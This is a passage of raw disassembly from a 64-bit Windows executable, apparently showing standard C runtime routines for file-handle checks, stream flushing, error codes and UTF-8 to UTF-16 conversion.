   14000cc52:	48 8d 05 77 eb 00 00 	lea    0xeb77(%rip),%rax        # 0x14001b7d0
   14000cc59:	4a 8b 0c e8          	mov    (%rax,%r13,8),%rcx
   14000cc5d:	42 38 5c f9 38       	cmp    %bl,0x38(%rcx,%r15,8)
   14000cc62:	7d 4d                	jge    0x14000ccb1
   14000cc64:	8b ce                	mov    %esi,%ecx
   14000cc66:	40 84 f6             	test   %sil,%sil
   14000cc69:	74 32                	je     0x14000cc9d
   14000cc6b:	83 e9 01             	sub    $0x1,%ecx
   14000cc6e:	74 19                	je     0x14000cc89
   14000cc70:	83 f9 01             	cmp    $0x1,%ecx
   14000cc73:	75 79                	jne    0x14000ccee
   14000cc75:	45 8b ce             	mov    %r14d,%r9d
   14000cc78:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000cc7c:	4c 8b c7             	mov    %rdi,%r8
   14000cc7f:	41 8b d4             	mov    %r12d,%edx
   14000cc82:	e8 9d fa ff ff       	call   0x14000c724
   14000cc87:	eb bd                	jmp    0x14000cc46
   14000cc89:	45 8b ce             	mov    %r14d,%r9d
   14000cc8c:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000cc90:	4c 8b c7             	mov    %rdi,%r8
   14000cc93:	41 8b d4             	mov    %r12d,%edx
   14000cc96:	e8 a5 fb ff ff       	call   0x14000c840
   14000cc9b:	eb a9                	jmp    0x14000cc46
   14000cc9d:	45 8b ce             	mov    %r14d,%r9d
   14000cca0:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000cca4:	4c 8b c7             	mov    %rdi,%r8
   14000cca7:	41 8b d4             	mov    %r12d,%edx
   14000ccaa:	e8 71 f9 ff ff       	call   0x14000c620
   14000ccaf:	eb 95                	jmp    0x14000cc46
   14000ccb1:	4a 8b 4c f9 28       	mov    0x28(%rcx,%r15,8),%rcx
   14000ccb6:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   14000ccba:	33 c0                	xor    %eax,%eax
   14000ccbc:	45 8b c6             	mov    %r14d,%r8d
   14000ccbf:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   14000ccc4:	48 8b d7             	mov    %rdi,%rdx
   14000ccc7:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   14000cccb:	89 45 d8             	mov    %eax,-0x28(%rbp)
   14000ccce:	ff 15 5c 25 00 00    	call   *0x255c(%rip)        # 0x14000f230
   14000ccd4:	85 c0                	test   %eax,%eax
   14000ccd6:	75 09                	jne    0x14000cce1
   14000ccd8:	ff 15 f2 23 00 00    	call   *0x23f2(%rip)        # 0x14000f0d0
   14000ccde:	89 45 d0             	mov    %eax,-0x30(%rbp)
   14000cce1:	8b 5d d8             	mov    -0x28(%rbp),%ebx
   14000cce4:	f2 0f 10 45 d0       	movsd  -0x30(%rbp),%xmm0
   14000cce9:	f2 0f 11 45 e0       	movsd  %xmm0,-0x20(%rbp)
   14000ccee:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000ccf2:	48 c1 e8 20          	shr    $0x20,%rax
   14000ccf6:	85 c0                	test   %eax,%eax
   14000ccf8:	75 64                	jne    0x14000cd5e
   14000ccfa:	8b 45 e0             	mov    -0x20(%rbp),%eax
   14000ccfd:	85 c0                	test   %eax,%eax
   14000ccff:	74 2d                	je     0x14000cd2e
   14000cd01:	83 f8 05             	cmp    $0x5,%eax
   14000cd04:	75 1b                	jne    0x14000cd21
   14000cd06:	e8 35 aa ff ff       	call   0x140007740
   14000cd0b:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000cd11:	e8 0a aa ff ff       	call   0x140007720
   14000cd16:	c7 00 05 00 00 00    	movl   $0x5,(%rax)
   14000cd1c:	e9 c2 fd ff ff       	jmp    0x14000cae3
   14000cd21:	8b 4d e0             	mov    -0x20(%rbp),%ecx
   14000cd24:	e8 a7 a9 ff ff       	call   0x1400076d0
   14000cd29:	e9 b5 fd ff ff       	jmp    0x14000cae3
   14000cd2e:	48 8d 05 9b ea 00 00 	lea    0xea9b(%rip),%rax        # 0x14001b7d0
   14000cd35:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   14000cd39:	42 f6 44 f8 38 40    	testb  $0x40,0x38(%rax,%r15,8)
   14000cd3f:	74 05                	je     0x14000cd46
   14000cd41:	80 3f 1a             	cmpb   $0x1a,(%rdi)
   14000cd44:	74 1f                	je     0x14000cd65
   14000cd46:	e8 f5 a9 ff ff       	call   0x140007740
   14000cd4b:	c7 00 1c 00 00 00    	movl   $0x1c,(%rax)
   14000cd51:	e8 ca a9 ff ff       	call   0x140007720
   14000cd56:	83 20 00             	andl   $0x0,(%rax)
   14000cd59:	e9 85 fd ff ff       	jmp    0x14000cae3
   14000cd5e:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000cd61:	2b c3                	sub    %ebx,%eax
   14000cd63:	eb 02                	jmp    0x14000cd67
   14000cd65:	33 c0                	xor    %eax,%eax
   14000cd67:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   14000cd6e:	00 
   14000cd6f:	48 83 c4 60          	add    $0x60,%rsp
   14000cd73:	41 5f                	pop    %r15
   14000cd75:	41 5e                	pop    %r14
   14000cd77:	41 5d                	pop    %r13
   14000cd79:	41 5c                	pop    %r12
   14000cd7b:	5f                   	pop    %rdi
   14000cd7c:	5e                   	pop    %rsi
   14000cd7d:	5d                   	pop    %rbp
   14000cd7e:	c3                   	ret
   14000cd7f:	cc                   	int3
   14000cd80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000cd85:	57                   	push   %rdi
   14000cd86:	48 83 ec 30          	sub    $0x30,%rsp
   14000cd8a:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   14000cd8f:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000cd94:	e8 3f b0 ff ff       	call   0x140007dd8
   14000cd99:	90                   	nop
   14000cd9a:	bb 03 00 00 00       	mov    $0x3,%ebx
   14000cd9f:	89 5c 24 24          	mov    %ebx,0x24(%rsp)
   14000cda3:	3b 1d 5f ee 00 00    	cmp    0xee5f(%rip),%ebx        # 0x14001bc08
   14000cda9:	74 6d                	je     0x14000ce18
   14000cdab:	48 63 fb             	movslq %ebx,%rdi
   14000cdae:	48 8b 05 5b ee 00 00 	mov    0xee5b(%rip),%rax        # 0x14001bc10
   14000cdb5:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000cdb9:	48 85 c9             	test   %rcx,%rcx
   14000cdbc:	75 02                	jne    0x14000cdc0
   14000cdbe:	eb 54                	jmp    0x14000ce14
   14000cdc0:	8b 41 14             	mov    0x14(%rcx),%eax
   14000cdc3:	c1 e8 0d             	shr    $0xd,%eax
   14000cdc6:	a8 01                	test   $0x1,%al
   14000cdc8:	74 19                	je     0x14000cde3
   14000cdca:	48 8b 0d 3f ee 00 00 	mov    0xee3f(%rip),%rcx        # 0x14001bc10
   14000cdd1:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000cdd5:	e8 76 04 00 00       	call   0x14000d250
   14000cdda:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000cddd:	74 04                	je     0x14000cde3
   14000cddf:	ff 44 24 20          	incl   0x20(%rsp)
   14000cde3:	48 8b 05 26 ee 00 00 	mov    0xee26(%rip),%rax        # 0x14001bc10
   14000cdea:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000cdee:	48 83 c1 30          	add    $0x30,%rcx
   14000cdf2:	ff 15 18 25 00 00    	call   *0x2518(%rip)        # 0x14000f310
   14000cdf8:	48 8b 0d 11 ee 00 00 	mov    0xee11(%rip),%rcx        # 0x14001bc10
   14000cdff:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000ce03:	e8 18 b1 ff ff       	call   0x140007f20
   14000ce08:	48 8b 05 01 ee 00 00 	mov    0xee01(%rip),%rax        # 0x14001bc10
   14000ce0f:	48 83 24 f8 00       	andq   $0x0,(%rax,%rdi,8)
   14000ce14:	ff c3                	inc    %ebx
   14000ce16:	eb 87                	jmp    0x14000cd9f
   14000ce18:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000ce1d:	e8 0a b0 ff ff       	call   0x140007e2c
   14000ce22:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000ce26:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000ce2b:	48 83 c4 30          	add    $0x30,%rsp
   14000ce2f:	5f                   	pop    %rdi
   14000ce30:	c3                   	ret
   14000ce31:	cc                   	int3
   14000ce32:	cc                   	int3
   14000ce33:	cc                   	int3
   14000ce34:	40 53                	rex push %rbx
   14000ce36:	48 83 ec 20          	sub    $0x20,%rsp
   14000ce3a:	8b 41 14             	mov    0x14(%rcx),%eax
   14000ce3d:	48 8b d9             	mov    %rcx,%rbx
   14000ce40:	c1 e8 0d             	shr    $0xd,%eax
   14000ce43:	a8 01                	test   $0x1,%al
   14000ce45:	74 27                	je     0x14000ce6e
   14000ce47:	8b 41 14             	mov    0x14(%rcx),%eax
   14000ce4a:	c1 e8 06             	shr    $0x6,%eax
   14000ce4d:	a8 01                	test   $0x1,%al
   14000ce4f:	74 1d                	je     0x14000ce6e
   14000ce51:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   14000ce55:	e8 c6 b0 ff ff       	call   0x140007f20
   14000ce5a:	f0 81 63 14 bf fe ff 	lock andl $0xfffffebf,0x14(%rbx)
   14000ce61:	ff 
   14000ce62:	33 c0                	xor    %eax,%eax
   14000ce64:	48 89 43 08          	mov    %rax,0x8(%rbx)
   14000ce68:	48 89 03             	mov    %rax,(%rbx)
   14000ce6b:	89 43 10             	mov    %eax,0x10(%rbx)
   14000ce6e:	48 83 c4 20          	add    $0x20,%rsp
   14000ce72:	5b                   	pop    %rbx
   14000ce73:	c3                   	ret
   14000ce74:	48 83 ec 28          	sub    $0x28,%rsp
   14000ce78:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   14000ce7b:	75 0d                	jne    0x14000ce8a
   14000ce7d:	e8 be a8 ff ff       	call   0x140007740
   14000ce82:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000ce88:	eb 42                	jmp    0x14000cecc
   14000ce8a:	85 c9                	test   %ecx,%ecx
   14000ce8c:	78 2e                	js     0x14000cebc
   14000ce8e:	3b 0d 3c ed 00 00    	cmp    0xed3c(%rip),%ecx        # 0x14001bbd0
   14000ce94:	73 26                	jae    0x14000cebc
   14000ce96:	48 63 c9             	movslq %ecx,%rcx
   14000ce99:	48 8d 15 30 e9 00 00 	lea    0xe930(%rip),%rdx        # 0x14001b7d0
   14000cea0:	48 8b c1             	mov    %rcx,%rax
   14000cea3:	83 e1 3f             	and    $0x3f,%ecx
   14000cea6:	48 c1 f8 06          	sar    $0x6,%rax
   14000ceaa:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000ceae:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   14000ceb2:	0f b6 44 c8 38       	movzbl 0x38(%rax,%rcx,8),%eax
   14000ceb7:	83 e0 40             	and    $0x40,%eax
   14000ceba:	eb 12                	jmp    0x14000cece
   14000cebc:	e8 7f a8 ff ff       	call   0x140007740
   14000cec1:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000cec7:	e8 54 a7 ff ff       	call   0x140007620
   14000cecc:	33 c0                	xor    %eax,%eax
   14000cece:	48 83 c4 28          	add    $0x28,%rsp
   14000ced2:	c3                   	ret
   14000ced3:	cc                   	int3
   14000ced4:	40 53                	rex push %rbx
   14000ced6:	48 83 ec 40          	sub    $0x40,%rsp
   14000ceda:	48 63 d9             	movslq %ecx,%rbx
   14000cedd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000cee2:	e8 09 89 ff ff       	call   0x1400057f0
   14000cee7:	8d 43 01             	lea    0x1(%rbx),%eax
   14000ceea:	3d 00 01 00 00       	cmp    $0x100,%eax
   14000ceef:	77 13                	ja     0x14000cf04
   14000cef1:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000cef6:	48 8b 08             	mov    (%rax),%rcx
   14000cef9:	0f b7 04 59          	movzwl (%rcx,%rbx,2),%eax
   14000cefd:	25 00 80 00 00       	and    $0x8000,%eax
   14000cf02:	eb 02                	jmp    0x14000cf06
   14000cf04:	33 c0                	xor    %eax,%eax
   14000cf06:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000cf0b:	74 0c                	je     0x14000cf19
   14000cf0d:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000cf12:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000cf19:	48 83 c4 40          	add    $0x40,%rsp
   14000cf1d:	5b                   	pop    %rbx
   14000cf1e:	c3                   	ret
   14000cf1f:	cc                   	int3
   14000cf20:	40 53                	rex push %rbx
   14000cf22:	48 83 ec 30          	sub    $0x30,%rsp
   14000cf26:	48 8b d9             	mov    %rcx,%rbx
   14000cf29:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000cf2e:	e8 81 03 00 00       	call   0x14000d2b4
   14000cf33:	48 83 f8 04          	cmp    $0x4,%rax
   14000cf37:	77 1a                	ja     0x14000cf53
   14000cf39:	8b 54 24 20          	mov    0x20(%rsp),%edx
   14000cf3d:	b9 fd ff 00 00       	mov    $0xfffd,%ecx
   14000cf42:	81 fa ff ff 00 00    	cmp    $0xffff,%edx
   14000cf48:	0f 47 d1             	cmova  %ecx,%edx
   14000cf4b:	48 85 db             	test   %rbx,%rbx
   14000cf4e:	74 03                	je     0x14000cf53
   14000cf50:	66 89 13             	mov    %dx,(%rbx)
   14000cf53:	48 83 c4 30          	add    $0x30,%rsp
   14000cf57:	5b                   	pop    %rbx
   14000cf58:	c3                   	ret
   14000cf59:	cc                   	int3
   14000cf5a:	cc                   	int3
   14000cf5b:	cc                   	int3
   14000cf5c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000cf61:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000cf66:	57                   	push   %rdi
   14000cf67:	41 54                	push   %r12
   14000cf69:	41 55                	push   %r13
   14000cf6b:	41 56                	push   %r14
   14000cf6d:	41 57                	push   %r15
   14000cf6f:	48 83 ec 20          	sub    $0x20,%rsp
   14000cf73:	48 8b 3a             	mov    (%rdx),%rdi
   14000cf76:	45 33 ed             	xor    %r13d,%r13d
   14000cf79:	4d 8b e1             	mov    %r9,%r12
   14000cf7c:	49 8b e8             	mov    %r8,%rbp
   14000cf7f:	4c 8b f2             	mov    %rdx,%r14
   14000cf82:	4c 8b f9             	mov    %rcx,%r15
   14000cf85:	48 85 c9             	test   %rcx,%rcx
   14000cf88:	0f 84 ee 00 00 00    	je     0x14000d07c
   14000cf8e:	48 8b d9             	mov    %rcx,%rbx
   14000cf91:	4d 85 c0             	test   %r8,%r8
   14000cf94:	0f 84 a1 00 00 00    	je     0x14000d03b
   14000cf9a:	44 38 2f             	cmp    %r13b,(%rdi)
   14000cf9d:	75 08                	jne    0x14000cfa7
   14000cf9f:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000cfa5:	eb 1d                	jmp    0x14000cfc4
   14000cfa7:	44 38 6f 01          	cmp    %r13b,0x1(%rdi)
   14000cfab:	75 08                	jne    0x14000cfb5
   14000cfad:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000cfb3:	eb 0f                	jmp    0x14000cfc4
   14000cfb5:	8a 47 02             	mov    0x2(%rdi),%al
   14000cfb8:	f6 d8                	neg    %al
   14000cfba:	4d 1b c0             	sbb    %r8,%r8
   14000cfbd:	49 f7 d8             	neg    %r8
   14000cfc0:	49 83 c0 03          	add    $0x3,%r8
   14000cfc4:	4d 8b cc             	mov    %r12,%r9
   14000cfc7:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000cfcc:	48 8b d7             	mov    %rdi,%rdx
   14000cfcf:	e8 e0 02 00 00       	call   0x14000d2b4
   14000cfd4:	48 8b d0             	mov    %rax,%rdx
   14000cfd7:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000cfdb:	74 75                	je     0x14000d052
   14000cfdd:	48 85 c0             	test   %rax,%rax
   14000cfe0:	74 67                	je     0x14000d049
   14000cfe2:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   14000cfe6:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
   14000cfec:	76 39                	jbe    0x14000d027
   14000cfee:	48 83 fd 01          	cmp    $0x1,%rbp
   14000cff2:	76 47                	jbe    0x14000d03b
   14000cff4:	81 c1 00 00 ff ff    	add    $0xffff0000,%ecx
   14000cffa:	41 b8 00 d8 00 00    	mov    $0xd800,%r8d
   14000d000:	8b c1                	mov    %ecx,%eax
   14000d002:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   14000d006:	c1 e8 0a             	shr    $0xa,%eax
   14000d009:	48 ff cd             	dec    %rbp
   14000d00c:	66 41 0b c0          	or     %r8w,%ax
   14000d010:	66 89 03             	mov    %ax,(%rbx)
   14000d013:	b8 ff 03 00 00       	mov    $0x3ff,%eax
   14000d018:	66 23 c8             	and    %ax,%cx
   14000d01b:	48 83 c3 02          	add    $0x2,%rbx
   14000d01f:	b8 00 dc 00 00       	mov    $0xdc00,%eax
   14000d024:	66 0b c8             	or     %ax,%cx
   14000d027:	66 89 0b             	mov    %cx,(%rbx)
   14000d02a:	48 03 fa             	add    %rdx,%rdi
   14000d02d:	48 83 c3 02          	add    $0x2,%rbx
   14000d031:	48 83 ed 01          	sub    $0x1,%rbp
   14000d035:	0f 85 5f ff ff ff    	jne    0x14000cf9a
   14000d03b:	49 2b df             	sub    %r15,%rbx
   14000d03e:	49 89 3e             	mov    %rdi,(%r14)
   14000d041:	48 d1 fb             	sar    $1,%rbx
   14000d044:	48 8b c3             	mov    %rbx,%rax
   14000d047:	eb 1b                	jmp    0x14000d064
   14000d049:	49 8b fd             	mov    %r13,%rdi
   14000d04c:	66 44 89 2b          	mov    %r13w,(%rbx)
   14000d050:	eb e9                	jmp    0x14000d03b
   14000d052:	49 89 3e             	mov    %rdi,(%r14)
   14000d055:	e8 e6 a6 ff ff       	call   0x140007740
   14000d05a:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   14000d060:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000d064:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   14000d069:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   14000d06e:	48 83 c4 20          	add    $0x20,%rsp
   14000d072:	41 5f                	pop    %r15
   14000d074:	41 5e                	pop    %r14
   14000d076:	41 5d                	pop    %r13
   14000d078:	41 5c                	pop    %r12
   14000d07a:	5f                   	pop    %rdi
   14000d07b:	c3                   	ret
   14000d07c:	49 8b dd             	mov    %r13,%rbx
   14000d07f:	44 38 2f             	cmp    %r13b,(%rdi)
   14000d082:	75 08                	jne    0x14000d08c
   14000d084:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000d08a:	eb 1d                	jmp    0x14000d0a9
   14000d08c:	44 38 6f 01          	cmp    %r13b,0x1(%rdi)
   14000d090:	75 08                	jne    0x14000d09a
   14000d092:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000d098:	eb 0f                	jmp    0x14000d0a9
   14000d09a:	8a 47 02             	mov    0x2(%rdi),%al
   14000d09d:	f6 d8                	neg    %al
   14000d09f:	4d 1b c0             	sbb    %r8,%r8
   14000d0a2:	49 f7 d8             	neg    %r8
   14000d0a5:	49 83 c0 03          	add    $0x3,%r8
   14000d0a9:	4d 8b cc             	mov    %r12,%r9
   14000d0ac:	48 8b d7             	mov    %rdi,%rdx
   14000d0af:	33 c9                	xor    %ecx,%ecx
   14000d0b1:	e8 fe 01 00 00       	call   0x14000d2b4
   14000d0b6:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000d0ba:	74 99                	je     0x14000d055
   14000d0bc:	48 85 c0             	test   %rax,%rax
   14000d0bf:	74 83                	je     0x14000d044
   14000d0c1:	48 83 f8 04          	cmp    $0x4,%rax
   14000d0c5:	75 03                	jne    0x14000d0ca
   14000d0c7:	48 ff c3             	inc    %rbx
   14000d0ca:	48 03 f8             	add    %rax,%rdi
   14000d0cd:	48 ff c3             	inc    %rbx
   14000d0d0:	eb ad                	jmp    0x14000d07f
   14000d0d2:	cc                   	int3
   14000d0d3:	cc                   	int3
   14000d0d4:	33 c0                	xor    %eax,%eax
   14000d0d6:	38 01                	cmp    %al,(%rcx)
   14000d0d8:	74 0e                	je     0x14000d0e8
   14000d0da:	48 3b c2             	cmp    %rdx,%rax
   14000d0dd:	74 09                	je     0x14000d0e8
   14000d0df:	48 ff c0             	inc    %rax
   14000d0e2:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   14000d0e6:	75 f2                	jne    0x14000d0da
   14000d0e8:	c3                   	ret
   14000d0e9:	cc                   	int3
   14000d0ea:	cc                   	int3
   14000d0eb:	cc                   	int3
   14000d0ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d0f1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000d0f6:	57                   	push   %rdi
   14000d0f7:	48 83 ec 20          	sub    $0x20,%rsp
   14000d0fb:	48 63 d9             	movslq %ecx,%rbx
   14000d0fe:	41 8b f8             	mov    %r8d,%edi
   14000d101:	8b cb                	mov    %ebx,%ecx
   14000d103:	48 8b f2             	mov    %rdx,%rsi
   14000d106:	e8 59 ca ff ff       	call   0x140009b64
   14000d10b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000d10f:	75 11                	jne    0x14000d122
   14000d111:	e8 2a a6 ff ff       	call   0x140007740
   14000d116:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000d11c:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000d120:	eb 53                	jmp    0x14000d175
   14000d122:	44 8b cf             	mov    %edi,%r9d
   14000d125:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   14000d12a:	48 8b d6             	mov    %rsi,%rdx
   14000d12d:	48 8b c8             	mov    %rax,%rcx
   14000d130:	ff 15 12 21 00 00    	call   *0x2112(%rip)        # 0x14000f248
   14000d136:	85 c0                	test   %eax,%eax
   14000d138:	75 0f                	jne    0x14000d149
   14000d13a:	ff 15 90 1f 00 00    	call   *0x1f90(%rip)        # 0x14000f0d0
   14000d140:	8b c8                	mov    %eax,%ecx
   14000d142:	e8 89 a5 ff ff       	call   0x1400076d0
   14000d147:	eb d3                	jmp    0x14000d11c
   14000d149:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000d14e:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000d152:	74 c8                	je     0x14000d11c
   14000d154:	48 8b d3             	mov    %rbx,%rdx
   14000d157:	4c 8d 05 72 e6 00 00 	lea    0xe672(%rip),%r8        # 0x14001b7d0
   14000d15e:	83 e2 3f             	and    $0x3f,%edx
   14000d161:	48 8b cb             	mov    %rbx,%rcx
   14000d164:	48 c1 f9 06          	sar    $0x6,%rcx
   14000d168:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000d16c:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000d170:	80 64 d1 38 fd       	andb   $0xfd,0x38(%rcx,%rdx,8)
   14000d175:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000d17a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000d17f:	48 83 c4 20          	add    $0x20,%rsp
   14000d183:	5f                   	pop    %rdi
   14000d184:	c3                   	ret
   14000d185:	cc                   	int3
   14000d186:	cc                   	int3
   14000d187:	cc                   	int3
   14000d188:	e9 5f ff ff ff       	jmp    0x14000d0ec
   14000d18d:	cc                   	int3
   14000d18e:	cc                   	int3
   14000d18f:	cc                   	int3
   14000d190:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   14000d195:	48 83 ec 28          	sub    $0x28,%rsp
   14000d199:	e8 9e 08 00 00       	call   0x14000da3c
   14000d19e:	85 c0                	test   %eax,%eax
   14000d1a0:	74 1f                	je     0x14000d1c1
   14000d1a2:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000d1a7:	ba 01 00 00 00       	mov    $0x1,%edx
   14000d1ac:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000d1b1:	e8 f6 08 00 00       	call   0x14000daac
   14000d1b6:	85 c0                	test   %eax,%eax
   14000d1b8:	74 07                	je     0x14000d1c1
   14000d1ba:	0f b7 44 24 30       	movzwl 0x30(%rsp),%eax
   14000d1bf:	eb 05                	jmp    0x14000d1c6
   14000d1c1:	b8 ff ff 00 00       	mov    $0xffff,%eax
   14000d1c6:	48 83 c4 28          	add    $0x28,%rsp
   14000d1ca:	c3                   	ret
   14000d1cb:	cc                   	int3
   14000d1cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d1d1:	57                   	push   %rdi
   14000d1d2:	48 83 ec 20          	sub    $0x20,%rsp
   14000d1d6:	48 8b d9             	mov    %rcx,%rbx
   14000d1d9:	48 85 c9             	test   %rcx,%rcx
   14000d1dc:	75 15                	jne    0x14000d1f3
   14000d1de:	e8 5d a5 ff ff       	call   0x140007740
   14000d1e3:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000d1e9:	e8 32 a4 ff ff       	call   0x140007620
   14000d1ee:	83 c8 ff             	or     $0xffffffff,%eax
   14000d1f1:	eb 51                	jmp    0x14000d244
   14000d1f3:	8b 41 14             	mov    0x14(%rcx),%eax
   14000d1f6:	83 cf ff             	or     $0xffffffff,%edi
   14000d1f9:	c1 e8 0d             	shr    $0xd,%eax
   14000d1fc:	a8 01                	test   $0x1,%al
   14000d1fe:	74 3a                	je     0x14000d23a
   14000d200:	e8 3b db ff ff       	call   0x14000ad40
   14000d205:	48 8b cb             	mov    %rbx,%rcx
   14000d208:	8b f8                	mov    %eax,%edi
   14000d20a:	e8 25 fc ff ff       	call   0x14000ce34
   14000d20f:	48 8b cb             	mov    %rbx,%rcx
   14000d212:	e8 15 df ff ff       	call   0x14000b12c
   14000d217:	8b c8                	mov    %eax,%ecx
   14000d219:	e8 c2 09 00 00       	call   0x14000dbe0
   14000d21e:	85 c0                	test   %eax,%eax
   14000d220:	79 05                	jns    0x14000d227
   14000d222:	83 cf ff             	or     $0xffffffff,%edi
   14000d225:	eb 13                	jmp    0x14000d23a
   14000d227:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000d22b:	48 85 c9             	test   %rcx,%rcx
   14000d22e:	74 0a                	je     0x14000d23a
   14000d230:	e8 eb ac ff ff       	call   0x140007f20
   14000d235:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   14000d23a:	48 8b cb             	mov    %rbx,%rcx
   14000d23d:	e8 02 0b 00 00       	call   0x14000dd44
   14000d242:	8b c7                	mov    %edi,%eax
   14000d244:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000d249:	48 83 c4 20          	add    $0x20,%rsp
   14000d24d:	5f                   	pop    %rdi
   14000d24e:	c3                   	ret
   14000d24f:	cc                   	int3
   14000d250:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000d255:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000d25a:	57                   	push   %rdi
   14000d25b:	48 83 ec 20          	sub    $0x20,%rsp
   14000d25f:	48 8b d9             	mov    %rcx,%rbx
   14000d262:	48 85 c9             	test   %rcx,%rcx
   14000d265:	75 1e                	jne    0x14000d285
   14000d267:	e8 d4 a4 ff ff       	call   0x140007740
   14000d26c:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000d272:	e8 a9 a3 ff ff       	call   0x140007620
   14000d277:	83 c8 ff             	or     $0xffffffff,%eax
   14000d27a:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000d27f:	48 83 c4 20          	add    $0x20,%rsp
   14000d283:	5f                   	pop    %rdi
   14000d284:	c3                   	ret
   14000d285:	8b 41 14             	mov    0x14(%rcx),%eax
   14000d288:	c1 e8 0c             	shr    $0xc,%eax
   14000d28b:	a8 01                	test   $0x1,%al
   14000d28d:	74 07                	je     0x14000d296
   14000d28f:	e8 b0 0a 00 00       	call   0x14000dd44
   14000d294:	eb e1                	jmp    0x14000d277
   14000d296:	e8 f1 dc ff ff       	call   0x14000af8c
   14000d29b:	90                   	nop
   14000d29c:	48 8b cb             	mov    %rbx,%rcx
   14000d29f:	e8 28 ff ff ff       	call   0x14000d1cc
   14000d2a4:	8b f8                	mov    %eax,%edi
   14000d2a6:	48 8b cb             	mov    %rbx,%rcx
   14000d2a9:	e8 ea dc ff ff       	call   0x14000af98
   14000d2ae:	8b c7                	mov    %edi,%eax
   14000d2b0:	eb c8                	jmp    0x14000d27a
   14000d2b2:	cc                   	int3
   14000d2b3:	cc                   	int3
   14000d2b4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000d2b9:	55                   	push   %rbp
   14000d2ba:	56                   	push   %rsi
   14000d2bb:	57                   	push   %rdi
   14000d2bc:	41 56                	push   %r14
   14000d2be:	41 57                	push   %r15
   14000d2c0:	48 83 ec 40          	sub    $0x40,%rsp
   14000d2c4:	48 8b 05 35 cd 00 00 	mov    0xcd35(%rip),%rax        # 0x14001a000
   14000d2cb:	48 33 c4             	xor    %rsp,%rax
   14000d2ce:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000d2d3:	45 33 d2             	xor    %r10d,%r10d
   14000d2d6:	4c 8d 1d 53 e9 00 00 	lea    0xe953(%rip),%r11        # 0x14001bc30
   14000d2dd:	4d 85 c9             	test   %r9,%r9
